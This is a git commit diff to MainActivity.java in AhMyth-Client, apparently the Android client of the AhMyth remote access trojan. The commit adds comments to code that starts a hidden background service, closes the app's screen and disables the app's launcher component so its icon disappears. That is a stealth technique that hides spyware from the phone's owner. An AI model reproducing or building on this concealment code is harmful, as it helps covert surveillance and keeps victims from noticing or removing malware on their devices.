7e9638d8a6f0fe6130cc976397f3d9864d369614
Pranjal Basak <66166653+PranjalBasak@users.noreply.github.com>
2024-01-28 15:07:37 +0600

    Update MainActivity.java

--- AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/MainActivity.java
+++ AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/MainActivity.java
@@ -9,23 +9,29 @@ import android.util.Log;
 import android.view.View;
 import android.widget.Toast;
 
-
-
 public class MainActivity extends Activity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        // Start the MainService
         startService(new Intent(this, MainService.class));
+
+        // Finish the current activity
         finish();
+
+        // Hide the app icon from the launcher
         fn_hideicon();
     }
-    
 
     private void fn_hideicon() {
-        getPackageManager().setComponentEnabledSetting(getComponentName(),
+        // Disable the app's component to hide the icon from the launcher
+        getPackageManager().setComponentEnabledSetting(
+                getComponentName(),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
+                PackageManager.DONT_KILL_APP
+        );
     }
 }
